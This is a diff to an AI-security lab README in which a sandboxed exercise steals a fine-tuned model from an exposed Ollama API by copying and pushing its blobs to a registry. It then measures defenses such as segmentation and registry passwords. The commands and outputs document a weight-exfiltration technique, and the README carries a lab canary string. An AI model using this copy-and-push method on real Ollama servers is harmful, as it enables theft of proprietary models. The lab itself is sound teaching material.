@@ -15,8 +15,8 @@ backends:
   external-api: n/a
 hardware: "CPU only. 4 GB Docker VM memory. About 800 MB in lab volumes for the public base and the registry copy. Images if missing: ollama/ollama:0.40.11 (~7 GB), registry:3 (~80 MB), plus the shared workbench image."
 canary: ATLAS-CANARY-w54t
-last_tested: 2026-11-01
-tested_on: "macOS 15.7.3 arm64, OrbStack, Docker 29.8.2, Compose 5.5.0, workbench v3, ollama/ollama:0.40.11, registry:3"
+last_tested: 2026-11-13
+tested_on: "macOS 15.7.3 arm64, OrbStack, Docker 29.8.2, Compose 5.5.0, workbench v4, ollama/ollama:0.40.11, registry:3"
 ---
 
 # LAB-54 · An open Ollama port and a stolen fine-tune
@@ -99,7 +99,7 @@ Scripts always run in the workbench or the outsider service. Nothing in this lab
 - "Start here" in the [labs index](../README.md) is done.
 - Labs to finish first: [LAB-17 · GGUF is data, its template is code](../format-gguf/README.md) (what a GGUF file holds; the stolen blob is one).
 - Later in the path: [LAB-09 · Stealing a classifier through its API](../attack-model-imitation/README.md) (the neighboring exercise: copying behavior from queries instead of files).
-- Ollama is installed on the host and `ollama pull qwen2.5:0.5b` has run, on every backend, including container-ollama. The public model `qwen2.5:0.5b` is then in the host Ollama store (`~/.ollama/models`, or the directory you pass as `HOST_OLLAMA_MODELS`). The victim copies that one model. It does not pull weights.
+- Ollama is installed on the host and `ollama pull qwen2.5:0.5b` has run, on every backend, including container-ollama. The public model `qwen2.5:0.5b` is then in the host Ollama store (`~/.ollama/models`, or the directory you pass as `HOST_OLLAMA_MODELS`). The victim copies that one model and does not pull weights. If you have no host Ollama, use the fallback in Setup 2 instead.
 - Concepts to read first: [`attack-weight-theft`](https://ai-security-atlas.github.io/nodes/attack-weight-theft/), [`system-registry`](https://ai-security-atlas.github.io/nodes/system-registry/).
 
 ## Explainer
@@ -158,6 +158,15 @@ What to notice: both services become healthy, and `docker compose port` prints `
 **Why**
 
 The victim listens on the compose network only ([`system-serving`](https://ai-security-atlas.github.io/nodes/system-serving/)). `--force-recreate` on the registry starts it from the two-file compose set, so a later password step does not leak into the next run.
+
+> [!NOTE]
+> **No host Ollama?** If the host store has no `qwen2.5:0.5b`, the victim stops with `[!!] missing ...` and Setup 2 fails. Then run the fallback once and repeat Setup 2:
+>
+> ```bash
+> COMPOSE_FILE=compose.yaml:attack-weight-theft/compose.yaml COMPOSE_PROFILES=theft-seed docker compose run --rm victim-seed
+> ```
+>
+> `victim-seed` uses the victim's Ollama image and volume. It runs `ollama pull qwen2.5:0.5b` (about 400 MB from the Ollama library) over the default network, then exits. It runs only when you type this line. The victim itself stays on `theft`, which has no internet route. On the next start the victim finds the model in its volume and skips the host copy.
 
 ### Setup 3 — Check the environment
 
@@ -238,13 +247,13 @@ COMPOSE_FILE=compose.yaml:attack-weight-theft/compose.yaml docker compose run --
 ```text
 [atlas-lab] attack-weight-theft · s02_exfiltrate.py · torch 2.14.1+cpu · backend none
 [ok] POST /api/copy HTTP 200 -> registry:5000/lantern/ft:stolen
-[ok] POST /api/push insecure HTTP success in 2.7s (last status 'success')
+[ok] POST /api/push insecure HTTP success in 0.2s (last status 'success')
 [ok] GET /v2/lantern/ft/manifests/stolen HTTP 200
-[ok] model sha256:c5396e06af294bd101b30dce59131a76d2b773e76950acc870eda801d3ab0515 bytes 397807936 sha256 match True hashed in 0.25s
+[ok] model sha256:c5396e06af294bd101b30dce59131a76d2b773e76950acc870eda801d3ab0515 bytes 397807936 sha256 match True hashed in 1.43s
 [ok] template sha256:eb4402837c7829a690fa845de4d7f3fd842c2adee476d5341da8a46ea9255175 bytes 1482 sha256 match True canary False
 [ok] license sha256:832dd9e00a68dd83b3c3fb9f5588dad7dcf337a0db50f7d9483f310cd292e92e bytes 11343 sha256 match True canary False
-[ok] license sha256:21d9c1a7a42f5da42dc7a6a52ca2eac354d55daac765db31a7674e3f12f21793 bytes 80 sha256 match True canary True
 [ok] system sha256:38ff5b2338a8b35eb7ebeb29275dd196f47b053a9d2defc3301db2efc00ece11 bytes 130 sha256 match True canary True
+[ok] license sha256:21d9c1a7a42f5da42dc7a6a52ca2eac354d55daac765db31a7674e3f12f21793 bytes 80 sha256 match True canary True
 [ok] victim model digest equals pushed name: True
 victim digest 18fd17a4fd4ffc5fcfdc9761f9c89062c35245f740f5b5e4447587d5026a4e6f
 [ok] bytes in the stolen manifest: 397820971
@@ -255,7 +264,7 @@ What to notice: the push finishes in a few seconds, every blob hash matches its 
 
 **Why**
 
-Ollama's copy and push endpoints hand the blobs to whatever registry name you pass, here `registry:5000` on the lab network ([`attack-weight-theft`](https://ai-security-atlas.github.io/nodes/attack-weight-theft/)). Push time depends on whether the registry volume already holds the 397,807,936-byte weight blob from an earlier run, because blobs already stored are not sent again (Step 3 shows this). The reference run took 2.7 seconds; over the local Docker network even a cold copy takes only seconds. The manifest total, 397,820,971 bytes, counts layers only. The tag size in Step 1 also includes a small config blob that is not a layer.
+Ollama's copy and push endpoints hand the blobs to whatever registry name you pass, here `registry:5000` on the lab network ([`attack-weight-theft`](https://ai-security-atlas.github.io/nodes/attack-weight-theft/)). Push time depends on whether the registry volume already holds the 397,807,936-byte weight blob from an earlier run, because blobs already stored are not sent again (Step 3 shows this). The reference run took 0.2 seconds because its registry volume already held that blob from an earlier run. Over the local Docker network even a cold copy takes only seconds. The manifest total, 397,820,971 bytes, counts layers only. The tag size in Step 1 also includes a small config blob that is not a layer.
 
 ### Step 3 — Separate the public weight from the private layer · [explainer 4](explainer/index.html#attack-weight-theft/4)
 
@@ -272,7 +281,7 @@ COMPOSE_FILE=compose.yaml:attack-weight-theft/compose.yaml docker compose run --
 ```text
 [atlas-lab] attack-weight-theft · s03_fidelity.py · torch 2.14.1+cpu · backend none
 [ok] POST /api/copy public base HTTP 200 -> registry:5000/public/qwen2.5:0.5b
-[ok] pushed public base in 1.8s (blobs already stored are not sent again)
+[ok] pushed public base in 0.3s (blobs already stored are not sent again)
 fine-tune weight sha256:c5396e06af294bd101b30dce59131a76d2b773e76950acc870eda801d3ab0515
 public base weight sha256:c5396e06af294bd101b30dce59131a76d2b773e76950acc870eda801d3ab0515
 [ok] weight blob equals public base: True
@@ -308,15 +317,15 @@ COMPOSE_FILE=compose.yaml:attack-weight-theft/compose.yaml docker compose run --
 
 ```text
 [atlas-lab] attack-weight-theft · d1_segment.py · torch 2.14.1+cpu · backend none
-[ok] victim-ollama: reached=False in 25 ms (URLError: <urlopen error [Errno -3] Temporary failure in name resolution>)
-[ok] registry: reached=False in 1 ms (URLError: <urlopen error [Errno -3] Temporary failure in name resolution>)
+[ok] victim-ollama: reached=False in 46 ms (URLError: <urlopen error [Errno -3] Temporary failure in name resolution>)
+[ok] registry: reached=False in 0 ms (URLError: <urlopen error [Errno -3] Temporary failure in name resolution>)
 [ok] segmented: outsider blocked: True
 [atlas-lab] attack-weight-theft · d1_operator.py · torch 2.14.1+cpu · backend none
-[ok] operator GET /api/tags HTTP 200 median 6.9 ms over 5 trials
+[ok] operator GET /api/tags HTTP 200 median 9.9 ms over 5 trials
 [ok] operator still sees ATLAS-CANARY-w54t: True
 ```
 
-What to notice: the outsider fails both names in well under a second, while the operator still lists the fine-tune in about 7 ms.
+What to notice: the outsider fails both names in well under a second, while the operator still lists the fine-tune in about 10 ms.
 
 **Why**
 
@@ -328,6 +337,7 @@ The outsider container sits on the internal network `isolated`, which has no rou
 
 ```bash
 COMPOSE_FILE=compose.yaml:attack-weight-theft/compose.yaml:attack-weight-theft/compose.auth.yaml docker compose up -d --no-deps --force-recreate --wait registry
+COMPOSE_FILE=compose.yaml:attack-weight-theft/compose.yaml:attack-weight-theft/compose.auth.yaml docker compose run --no-deps --rm workbench python attack-weight-theft/scripts/s02_exfiltrate.py
 COMPOSE_FILE=compose.yaml:attack-weight-theft/compose.yaml:attack-weight-theft/compose.auth.yaml docker compose run --no-deps --rm workbench python attack-weight-theft/scripts/d2_registry_auth.py
 ```
 
@@ -336,19 +346,23 @@ COMPOSE_FILE=compose.yaml:attack-weight-theft/compose.yaml:attack-weight-theft/c
 ```text
  Container atlas-labs-attack-weight-theft-registry-1 Started
  Container atlas-labs-attack-weight-theft-registry-1 Healthy
+[atlas-lab] attack-weight-theft · s02_exfiltrate.py · torch 2.14.1+cpu · backend none
+[ok] POST /api/copy HTTP 200 -> registry:5000/lantern/ft:stolen
+[!!] push failed after 0.0s: realm host "" does not match original host "registry:5000"
+[ok] anonymous POST /v2/lantern/ft/blobs/uploads/ HTTP 401
 [atlas-lab] attack-weight-theft · d2_registry_auth.py · torch 2.14.1+cpu · backend none
-[ok] anonymous median HTTP 401 0.7 ms
-[ok] authenticated median HTTP 200 2.7 ms
-[ok] auth extra ms (authenticated median minus anonymous median): 2.0
+[ok] anonymous median HTTP 401 4.5 ms
+[ok] authenticated median HTTP 200 4.1 ms
+[ok] auth extra ms (authenticated median minus anonymous median): -0.5
 [ok] authenticated manifest still lists 397820971 bytes
 [ok] wrote audit.jsonl (10 lines)
 ```
 
-What to notice: anonymous reads become HTTP 401 and the lab password still returns HTTP 200; on the reference run the password added 2.0 ms at the median, and a repeat can land within a few milliseconds of that.
+What to notice: Step 2's push now fails, and the registry answers an anonymous upload with HTTP 401. Anonymous reads also get HTTP 401, while the lab password still returns HTTP 200. The password check's extra time was -0.5 ms at the median. The reference run's host was under heavy load, so that difference is noise: a repeat can land a few milliseconds either way.
 
 **Why**
 
-`compose.auth.yaml` turns on htpasswd for this registry only ([`defense-least-privilege`](https://ai-security-atlas.github.io/nodes/defense-least-privilege/)). The ten lines in `work/audit.jsonl` are the access record ([`defense-logging`](https://ai-security-atlas.github.io/nodes/defense-logging/)). `--no-deps` on the measurement keeps the password in place: a `docker compose run` that omits it rebuilds the registry from the two-file set and the 401 disappears. The password protects this internal registry: anonymous reads of the stored copy now get 401, and an anonymous push from Ollama into it would be refused as well (this lab does not measure that push). It does not delete the blobs already stored, and it does not close the theft path. An open Ollama API can still push to any other registry it can reach until port 11434 is closed (D1, `OLLAMA_HOST=127.0.0.1`, or an authenticating proxy in front of Ollama).
+`compose.auth.yaml` turns on htpasswd for this registry only ([`defense-least-privilege`](https://ai-security-atlas.github.io/nodes/defense-least-privilege/)). The ten lines in `work/audit.jsonl` are the access record ([`defense-logging`](https://ai-security-atlas.github.io/nodes/defense-logging/)). `--no-deps` on both runs keeps the password in place: a `docker compose run` that omits it rebuilds the registry from the two-file set and the 401 disappears. The password protects this internal registry. The second line repeats Step 2's push against it. Ollama sends no credentials, so the registry answers its first request with a password challenge, and Ollama gives up with a `realm host` error. That error does not name the status code, so the script then sends one anonymous upload request itself and prints the registry's HTTP 401. Anonymous reads of the stored copy get 401 too. The password does not delete the blobs already stored, and it does not close the theft path. An open Ollama API can still push to any other registry it can reach until port 11434 is closed (D1, `OLLAMA_HOST=127.0.0.1`, or an authenticating proxy in front of Ollama).
 
 ### Step D3 — Fingerprint the stolen system blob · [explainer 8](explainer/index.html#attack-weight-theft/8)
 
@@ -395,7 +409,7 @@ stolen bytes                                     397820971
 anonymous registry HTTP                          401
 authenticated registry HTTP                      200
 outsider blocked                                 True
-operator median ms                               6.9
+operator median ms                               9.9
 [ok] open api lists the fine-tune: True
 [ok] modelfile contains the canary: True
 [ok] fine-tune digest differs from the public base: True
@@ -440,7 +454,7 @@ COMPOSE_FILE=compose.yaml:attack-weight-theft/compose.yaml:attack-weight-theft/c
 
 ## Going Further
 
-- Repeat Step D2's manifest read a few dozen times and write down the spread of the password's extra milliseconds. The reference median was 2.0 ms; your spread is the measurement.
+- Repeat Step D2's manifest read a few dozen times and write down the spread of the password's extra milliseconds. The reference median was -0.5 ms on a heavily loaded host; your spread is the measurement.
 - After Step D3, push the same stolen tag to a second registry you add on `theft`, and check whether the system digest still matches. Decide what a match tells you about a copy that has already moved once.
 - The Ollama API stayed open after the registry password. Sketch a second listener change that would make Step 2's push fail, and say what the operator in Step D1 would still be able to do.
 
